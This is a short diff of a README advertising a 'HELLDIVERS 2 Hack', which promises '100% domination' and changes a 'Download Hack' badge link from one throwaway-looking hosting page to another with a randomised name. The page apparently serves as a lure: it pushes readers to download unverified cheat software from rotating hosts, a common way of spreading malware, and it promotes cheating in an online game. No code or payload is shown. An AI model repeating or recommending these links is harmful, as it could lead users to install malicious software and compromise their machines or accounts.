@@ -4,7 +4,7 @@
 
 Whether you're running Helldive difficulty or trolling bots in solo missions, these hacks give you 100% domination.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload19.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://HELLDIVERS-2-Hack-poreb.github.io/.github)
 ---
 
 ## 🎮 What Is a HELLDIVERS 2 Hack?
